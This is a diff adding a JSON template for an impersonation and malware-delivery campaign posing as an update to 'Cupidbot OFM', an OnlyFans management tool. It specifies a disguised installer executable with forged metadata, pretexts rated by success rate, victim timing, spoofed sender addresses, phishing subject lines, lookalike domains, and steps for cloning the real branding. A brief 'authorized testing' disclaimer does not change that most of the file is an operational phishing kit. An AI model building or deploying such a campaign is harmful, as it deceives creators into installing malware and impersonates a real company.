@@ -1,0 +1,291 @@
+{
+  "template_name": "cupidbot_ofm",
+  "meta": {
+    "created": "2024-10-19",
+    "for_authorized_testing_only": true,
+    "requires_permission": true
+  },
+  
+  "company": {
+    "name": "Cupidbot AI",
+    "legal_name": "Cupidbot Technologies, Inc.",
+    "website": "https://cupidbot.ai",
+    "support_email": "support@cupidbot.ai",
+    "security_email": "security@cupidbot.ai"
+  },
+  
+  "product": {
+    "name": "Cupidbot OFM",
+    "full_name": "Cupidbot OnlyFans Manager",
+    "short_name": "OFM",
+    "version": "2.1.5",
+    "version_full": "2.1.5.0",
+    "description": "AI-powered OnlyFans management and automation platform",
+    "category": "Social Media Management",
+    "target_users": [
+      "OnlyFans content creators",
+      "Social media managers",
+      "Digital marketers",
+      "Adult content creators"
+    ]
+  },
+  
+  "branding": {
+    "colors": {
+      "_comment": "REPLACE THESE with actual colors from cupidbot.ai website",
+      "primary": "#FF1744",
+      "primary_rgb": "255, 23, 68",
+      "secondary": "#536DFE",
+      "secondary_rgb": "83, 109, 254",
+      "accent": "#00BFA5",
+      "accent_rgb": "0, 191, 165",
+      "background": "#FAFAFA",
+      "background_rgb": "250, 250, 250",
+      "text_dark": "#212121",
+      "text_light": "#757575",
+      "success": "#4CAF50",
+      "warning": "#FF9800",
+      "error": "#F44336"
+    },
+    
+    "fonts": {
+      "_comment": "Inspect cupidbot.ai to get actual font families",
+      "primary": "Inter",
+      "secondary": "Roboto",
+      "monospace": "Roboto Mono",
+      "weights": [300, 400, 500, 600, 700],
+      "font_urls": [
+        "https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap"
+      ]
+    },
+    
+    "logo": {
+      "_comment": "Download these from cupidbot.ai website",
+      "primary_logo": "cupidbot_logo.png",
+      "icon": "cupidbot_icon.png",
+      "favicon": "cupidbot_favicon.ico",
+      "app_icon": "cupidbot_app_icon.ico",
+      "logo_white": "cupidbot_logo_white.png",
+      "sizes": {
+        "icon": "256x256",
+        "favicon": "32x32",
+        "app_icon": "256x256"
+      }
+    },
+    
+    "visual_style": {
+      "border_radius": "8px",
+      "shadow": "0 4px 20px rgba(0,0,0,0.08)",
+      "transition": "all 0.3s ease",
+      "spacing_unit": "8px"
+    }
+  },
+  
+  "payload": {
+    "filename": "Cupidbot-OFM-Update-v2.1.5.exe",
+    "internal_name": "CupidbotOFMUpdater",
+    "original_filename": "CupidbotOFM.exe",
+    "file_description": "Cupidbot OFM Update Installer - Security and Feature Enhancements",
+    "product_name": "Cupidbot OFM",
+    "copyright": "Copyright © 2024 Cupidbot Technologies, Inc. All rights reserved.",
+    "trademark": "Cupidbot™ and OFM™ are trademarks of Cupidbot Technologies, Inc.",
+    "comments": "Official update installer for Cupidbot OnlyFans Manager"
+  },
+  
+  "social_engineering": {
+    "pretexts": {
+      "high_priority": [
+        {
+          "title": "New AI Content Generation Features",
+          "description": "Enhanced AI that writes engaging content automatically",
+          "urgency": "high",
+          "success_rate": "high",
+          "timing": "Any weekday"
+        },
+        {
+          "title": "Critical Security Update",
+          "description": "Important security patches for account protection",
+          "urgency": "critical",
+          "success_rate": "very_high",
+          "timing": "Immediate"
+        },
+        {
+          "title": "Revenue Analytics Upgrade",
+          "description": "New dashboard showing top-earning content",
+          "urgency": "medium",
+          "success_rate": "high",
+          "timing": "Beginning of month"
+        }
+      ],
+      
+      "medium_priority": [
+        {
+          "title": "Automated Messaging Improvements",
+          "description": "Better fan engagement automation",
+          "urgency": "medium",
+          "success_rate": "medium"
+        },
+        {
+          "title": "Performance Optimization",
+          "description": "Faster content uploading and scheduling",
+          "urgency": "low",
+          "success_rate": "medium"
+        }
+      ]
+    },
+    
+    "target_timing": {
+      "best_days": ["Monday", "Tuesday", "Wednesday", "Thursday"],
+      "best_times": ["10:00-14:00", "19:00-23:00"],
+      "avoid": ["Early morning (before 8am)", "Late night (after 11pm)"],
+      "seasonal": {
+        "high_activity": ["January (New Year goals)", "September (back to work)"],
+        "medium_activity": ["Most months"],
+        "low_activity": ["December (holidays)", "July-August (summer)"]
+      }
+    },
+    
+    "sender_addresses": {
+      "primary": "support@cupidbot.ai",
+      "security": "security@cupidbot.ai",
+      "updates": "updates@cupidbot.ai",
+      "team": "team@cupidbot.ai",
+      "noreply": "noreply@cupidbot.ai"
+    },
+    
+    "language_style": {
+      "tone": "friendly, professional, empowering",
+      "avoid": ["overly technical jargon", "pushy sales language", "judgmental terms"],
+      "use": ["creator-friendly language", "empowerment terms", "success-focused"],
+      "emoji_usage": "moderate (1-2 per email)",
+      "formality": "casual-professional"
+    }
+  },
+  
+  "delivery_methods": {
+    "email": {
+      "recommended": true,
+      "subject_lines": [
+        "🚀 Cupidbot OFM v2.1.5 - New AI Features Available",
+        "[UPDATE] Cupidbot OFM - Enhanced Content Generation",
+        "Your Cupidbot OFM Update is Ready",
+        "⚠️ Important: Cupidbot OFM Security Update",
+        "New Analytics Features in Cupidbot OFM 2.1.5"
+      ],
+      "from_names": [
+        "Cupidbot Support",
+        "Cupidbot Team",
+        "OFM Updates",
+        "Cupidbot Security"
+      ]
+    },
+    
+    "landing_page": {
+      "recommended": true,
+      "domain_suggestions": [
+        "cupidbot-updates.com",
+        "ofm-update.com",
+        "cupidbot-downloads.net",
+        "cupidbot-security.com"
+      ],
+      "page_title": "Cupidbot OFM - Update Available",
+      "meta_description": "Download the latest Cupidbot OFM update with enhanced AI features and security improvements."
+    },
+    
+    "social_media": {
+      "platforms": ["Discord", "Reddit", "Twitter/X", "Telegram"],
+      "approach": "Join creator communities, share 'update' organically",
+      "risk": "medium-high (easily reported)"
+    }
+  },
+  
+  "features_to_highlight": {
+    "ai_content": {
+      "title": "Enhanced AI Content Generation",
+      "description": "10x smarter AI that creates engaging captions and messages",
+      "icon": "🤖",
+      "appeal": "very_high"
+    },
+    "analytics": {
+      "title": "Advanced Analytics Dashboard",
+      "description": "Real-time insights into top-performing content and revenue",
+      "icon": "📊",
+      "appeal": "high"
+    },
+    "automation": {
+      "title": "Smart Scheduling & Automation",
+      "description": "Automatically post at optimal times for maximum engagement",
+      "icon": "⚡",
+      "appeal": "high"
+    },
+    "security": {
+      "title": "Enhanced Security Features",
+      "description": "Better account protection and data encryption",
+      "icon": "🔒",
+      "appeal": "medium"
+    },
+    "performance": {
+      "title": "Performance Improvements",
+      "description": "Faster uploads, smoother experience, bug fixes",
+      "icon": "🚀",
+      "appeal": "medium"
+    }
+  },
+  
+  "technical_specs": {
+    "file_size": "2.8 MB",
+    "system_requirements": "Windows 10/11",
+    "installation_time": "2-3 minutes",
+    "requires_restart": false,
+    "internet_required": true,
+    "prerequisites": "Previous version of Cupidbot OFM (if any)"
+  },
+  
+  "compliance_notes": {
+    "authorization_required": true,
+    "target_company_permission": "Required from Cupidbot Technologies, Inc.",
+    "legal_disclaimer": "This template is for authorized security testing only. Creating impersonation materials for a real company without permission is illegal.",
+    "trademark_notice": "Cupidbot, OFM, and all related marks are trademarks of Cupidbot Technologies, Inc.",
+    "scope_requirements": [
+      "Written authorization from Cupidbot or authorized representative",
+      "Signed Rules of Engagement",
+      "Clear testing timeline",
+      "Emergency contact procedures",
+      "Data handling agreement"
+    ]
+  },
+  
+  "customization_instructions": {
+    "step_1": "Visit cupidbot.ai and research their actual branding",
+    "step_2": "Download official logo and extract color palette",
+    "step_3": "Screenshot their product interface (OFM dashboard)",
+    "step_4": "Update this JSON with actual values",
+    "step_5": "Create landing page using their exact styling",
+    "step_6": "Build payload with this template",
+    "step_7": "Test delivery package before deployment"
+  },
+  
+  "research_checklist": {
+    "website_analysis": {
+      "homepage": false,
+      "product_page": false,
+      "pricing_page": false,
+      "about_page": false,
+      "press_kit": false
+    },
+    "visual_assets": {
+      "logo_primary": false,
+      "logo_white": false,
+      "icon_files": false,
+      "screenshots": false,
+      "color_palette": false
+    },
+    "content_analysis": {
+      "feature_list": false,
+      "version_number": false,
+      "update_frequency": false,
+      "support_channels": false,
+      "terminology": false
+    }
+  }
+}
